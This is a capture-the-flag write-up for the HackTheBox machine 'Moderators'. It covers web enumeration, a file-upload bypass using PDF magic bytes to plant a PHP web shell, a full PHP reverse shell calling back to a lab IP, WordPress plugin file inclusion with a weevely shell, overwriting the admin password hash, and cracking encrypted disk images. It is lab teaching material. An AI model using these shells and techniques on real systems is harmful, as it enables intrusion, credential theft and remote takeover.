# HackTheBox - Moderators

## NMAP

```bash
Nmap scan report for 10.10.11.173
Host is up (0.091s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Moderators
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)



<img src="https://i.imgur.com/Sp1GzMd.png"/>

We can find few usernames by scrolling down which might be useful 

<img src="https://i.imgur.com/O3gW6Ka.png"/>

There's a search field but it doesn't work 

<img src="https://i.imgur.com/r8Fdhq6.png"/>

Clicking the hamburger button we have few pages to explore out of which the blog page looks interesting has it's showing some bugs which were reported also the service page talks about the format of repots that are submitted

<img src="https://i.imgur.com/hSlRt5B.png"/>

<img src="https://i.imgur.com/52af7WL.png"/>


<img src="https://i.imgur.com/m4uxImw.png"/>

Going through some of the reports, it maksed the domain name

<img src="https://i.imgur.com/R0cZ11y.png"/>

<img src="https://i.imgur.com/T7PCGYy.png"/>

<img src="https://i.imgur.com/d4wvWrW.png"/>

On the last report, it does give a hint about the subdomain which is `help` , I added `moderators.htb`  in `hosts` file and tried fuzzing for subdomains with `wfuzz` but it didn't find anyhting, it could be that moderators.htb isn't the valid domain name 

<img src="https://i.imgur.com/TWQK9b9.png"/>

Running `gobuster` to fuzz for files and directories it returned `logs` which was interesting but returned a blank a page

<img src="https://i.imgur.com/Zlpq1XM.png"/>

<img src="https://i.imgur.com/PNmtoQM.png"/>

Further fuzzing for it reveals `/uploads`  and then a html file

<img src="https://i.imgur.com/6A3nAMa.png"/>

<img src="https://i.imgur.com/GHT94yg.png"/>

<img src="https://i.imgur.com/T9KR9md.png"/>

Now on the blog page, there were links of 3 reports however the blog talked about 5 vulnerabilities, so maybe we need to fuzz the report number which consists of 4 digits, so let's make a wordlist of numbers with `runch`

<img src="https://i.imgur.com/wnkX6fO.png"/>

<img src="https://i.imgur.com/LQlmXAA.png"/>

We have a total of 6 reports now so let's visit them

Report #7612 shows a blind command injection on `actionmeter.org.htb` as patched 

<img src="https://i.imgur.com/liKG060.png"/>

Report #2589 shows sql injection is patched on `healtharcade.io.htb`

<img src="https://i.imgur.com/y83Uzqk.png"/>

And the last report , Report #9798 shows sensitive information disclosure as not patched

<img src="https://i.imgur.com/trq9AzW.png"/>

The domain names don't work, but the last report is quiet intersting as we already found `/logs` and the report tells that it accepts the report number as md5 hash

<img src="https://i.imgur.com/nTt5dxR.png"/>

Remeber that the service page was talking about reports or logs being submitted in a pdf format so here we need to fuzz for pdf files in hashed report numbers

<img src="https://i.imgur.com/TAmUBTh.png"/>

Here I have just looped through contents of the valid report numbers and converted them into md5 hash

<img src="https://i.imgur.com/knIjM5p.png"/>

I appended these hash in common.txt file as we can only use wordlist and used `feroxbuster` as it can recursively fuzz for files

<img src="https://i.imgur.com/W4bOpS9.png"/>


This started to return `logs.pdf` in those hashed report numbers

<img src="https://i.imgur.com/foK4Nbr.png"/>

For Report #7612 it showed some logs and a path to php file which uploads pdf files

<img src="https://i.imgur.com/4JlkUUn.png"/>

<img src="https://i.imgur.com/aQKAkg2.png"/>

## Foothold

If we try to upload a php file having this content it will only allow upload pdf files

```php
<?php system($_GET['cmd']); ?>
```

<img src="https://i.imgur.com/gJ5RP2L.png"/>

<img src="https://i.imgur.com/YZVtThz.png"/>


To bypass this, we can add a pdf magic byte in our php file which act as a pdf file also when uploading the file we have to change the Content-Type from `application/x-php` to `application/pdf`

<img src="https://i.imgur.com/ESrL5Z1.png"/>

<img src="https://i.imgur.com/Co4Q77F.png"/>

<img src="https://i.imgur.com/m5grwP8.png"/>

The file is uploaded but on executing the commands through the `system` function it won't give any output

<img src="https://i.imgur.com/rzcJaEi.png"/>

So it could be that some php functions are disabled, we can try to list the disabled functions through `phpinfo()`

<img src="https://i.imgur.com/jxcaT1N.png"/>

<img src="https://i.imgur.com/nHSkVZC.png"/>


So the functions `pass_thru`, `system`, `exec` , `shell_exec`  and `pcntl_exec` are blocked , we can skip having the rce and directly just try getting a reverse shell from pentest monkey

```php
 set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.14.36"; $port = 2222; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\\n"; } }
```

<img src="https://i.imgur.com/Iy4ctZ9.png"/>

On uploading this, we'll get a shell as `www-data`

<img src="https://i.imgur.com/55GQQyu.png"/>


Stabilizing the shell with python3 so we can get a better shell 

<img src="https://i.imgur.com/tPxOtls.png"/>
Checking the services running on the machine with `ss -tulpn` we can there's 8080 open

<img src="https://i.imgur.com/DaNNuYR.png"/>

<img src="https://i.imgur.com/WOvJezS.png"/>

We can use `chisel` to port forward 8080 which we can transfer by hosting through python3, also to add `moderators.htb` in our hosts file

<img src="https://i.imgur.com/c8DCgrn.png"/>

<img src="https://i.imgur.com/6iRnibV.png"/>

<img src="https://i.imgur.com/sfZu9iu.png"/>

This is using wordpress we can tell this by looking at `wapplayzer` extension


<img src="https://i.imgur.com/3hVgozC.png"/>

Also we can find the directory of wordpress which is `/opt/site.new` and it's owned by `lexi` user


<img src="https://i.imgur.com/xhVBgJQ.png"/>

We can't read `wp-config.php` which has the database password for wordpress, so we'll need to enumerate users 

<img src="https://i.imgur.com/ZOqKihP.png"/>

We do see 2 plugins 

<img src="https://i.imgur.com/KMfosUN.png"/>

`password-manager`  didn't had any exploist related to it

<img src="https://i.imgur.com/ObYmCH4.png"/>


`Brandfolder`  3.0 is being used which had a LFI exploit

<img src="https://i.imgur.com/X7XqEdQ.png"/>

https://www.exploit-db.com/exploits/39591

The LFI exploit wasn't working 


<img src="https://i.imgur.com/hzEWys1.png"/>

But the first poc was related to including the files from the `wp-admin` directory by providing an absolute path to that folder

<img src="https://i.imgur.com/32x254z.png"/>

## Privilege Escalation (lexi)

To exploit this, we need to create a folder in `/var/www/html/logs/uploads` because that's the folder which is writeable

<img src="https://i.imgur.com/08crHsM.png"/>

In `post.php` I have included the `phpinfo();` to see if there any disabled functions

<img src="https://i.imgur.com/ax13sQg.png"/>

Visting the `callback.php` with the wordpress absolute path parameter `wp_abspath`

```
http://moderators.htb:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/
```

<img src="https://i.imgur.com/XwAsyiW.png"/>

I tried the same reverse shell here as well but it didn't worked, although it doesn't show any disabled php functions but still none of the commands were working 

<img src="https://i.imgur.com/N1cWUWk.png"/>

I found a tool called `weevely` for generating obfuscated php shells

https://www.acunetix.com/blog/articles/web-shells-action-introduction-web-shells-part-4/


With this I generated a php script, now we need to replace this file with the one in includes directory

<img src="https://i.imgur.com/Fjpxrzs.png"/>

<img src="https://i.imgur.com/TwZOwPO.png"/>

Making a request again with the absolute path variable with weevely we'll get a reverse shell as `lexi` user

```bash
./weevely.py http://moderators.htb:8080/wpcontent/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/ uwu
```

<img src="https://i.imgur.com/ldqce51.png"/>

We can grab this user's ssh key and login through ssh

<img src="https://i.imgur.com/ULiqc6i.png"/>

The wordpress password can be found from `wp-config.php` and we can try this on `john`  user

<img src="https://i.imgur.com/LrmNlg6.png"/>

<img src="https://i.imgur.com/sSwET5d.png"/>

Which didn't worked, so we can look at the plugin which is a password manager, so we'll find something there, as we have access to wordpress database, we can change admin user's password

<img src="https://i.imgur.com/VFcwHtp.png"/>

```
update wp_users SET user_pass = "$P$Bgz13AtQiY80g093FkqIKWQ8pIdLRX0" WHERE user_login = "admin";
```


<img src="https://i.imgur.com/RUjRQ0Q.png"/>

<img src="https://i.imgur.com/5MILwew.png"/>


From here we can get the ssh key for john

<img src="https://i.imgur.com/E1KBYOr.png"/>

We can now login as john using his ssh key

<img src="https://i.imgur.com/K2b1HCq.png"/>

In `stuff` directory we see two sub directories

<img src="https://i.imgur.com/SIo6l5J.png"/>

`VBOX` has an virtual box image and`exp` has some chats related to it, it tallks about the password policy and about the Vbox disk image

<img src="https://i.imgur.com/X5G0ZVy.png"/>

<img src="https://i.imgur.com/TQ3kyoy.png"/>

<img src="https://i.imgur.com/ZBR8Woa.png"/>

Host the files from the target machine with python3

<img src="https://i.imgur.com/vo2VE2b.png"/>

I honestly spend hours trying to mound the vdi with `qemu,` also converting into a raw format (.img) which didn't worked, tranferring the the files on windows machine, I tried importing the vdi image

<img src="https://i.imgur.com/KL8mtut.png"/>

So we have to make few changes into the vbox file as it's loading the vdi files `Ubuntu.vdi` and `2019.vdi` from `F:/2019.vdi`, so we need to provide it the full path also to remove the ubuntu.vdi and the ubuntu iso  so the .vbox file will look like this after editing it

<img src="https://i.imgur.com/BW2RB3X.png"/>

<img src="https://i.imgur.com/JRo7Onc.png"/>

After importing this vdi, it wasn't working as whenever I tried attaching it to a VM it would pause, so I went into `Disk Encryption` option which prompted that it needs Oracle VM extension pack, which can be downloaded from here

https://download.virtualbox.org/virtualbox/6.1.36/Oracle_VM_VirtualBox_Extension_Pack-6.1.36a-152435.vbox-extpack


<img src="https://i.imgur.com/2jnI5xS.png"/>

On installing the extension pack, it asks for the decrpytion password

<img src="https://i.imgur.com/Ne3TSvJ.png"/>


For this we can use this python to crack VDI image

https://github.com/axcheron/pyvboxdie-cracker

Which gets cracked with the password `computer`

<img src="https://i.imgur.com/IliXJMo.png"/>

We can now decrypt the vdi image 

<img src="https://i.imgur.com/X4aNewQ.png"/>

Add into to an existing VM

<img src="https://i.imgur.com/KWclhsM.png"/>

Using `blkid` we can see the attached the vdi which is encrypted

https://forums.virtualbox.org/viewtopic.php?f=7&t=101848

<img src="https://i.imgur.com/pAPRjPj.png"/>

To decrypt this we can use the script `grond.sh` with the same wordlist with which the vdi password was cracked 

http://www.incredigeek.com/home/downloads/grond.sh


<img src="https://i.imgur.com/y2qgwAA.png"/>

<img src="https://i.imgur.com/XXwqzD3.png"/>

Having the password `abc123` we can mount this using `cryptsetup` 


https://askubuntu.com/questions/63594/mount-encrypted-volumes-from-command-line


<img src="https://i.imgur.com/b3xQbWz.png"/>

By following these commands we can mount the voulme 


<img src="https://i.imgur.com/CDmDajw.png"/>

<img src="https://i.imgur.com/c6unUIj.png"/>

In `scripts/all-in-one` we can find a file named `distro_update.sh` having the password

 <img src="https://i.imgur.com/tE7JLog.png"/>

Which we can use on `john` to list privleges for the user and we can run everything as root 

<img src="https://i.imgur.com/4pmUy9P.png"/>

<img src="https://i.imgur.com/181Lzzl.png"/>

## References
- https://www.exploit-db.com/exploits/39591
- https://www.acunetix.com/blog/articles/web-shells-action-introduction-web-shells-part-4/
- https://www.useotools.com/wordpress-password-hash-generator/output
- https://github.com/axcheron/pyvboxdie-cracker
- https://forums.virtualbox.org/viewtopic.php?f=7&t=101848
- https://gist.github.com/micxer/63b49e09558904dd64ef78400c6b9517
- http://www.incredigeek.com/home/downloads/grond.sh
- https://askubuntu.com/questions/63594/mount-encrypted-volumes-from-command-line
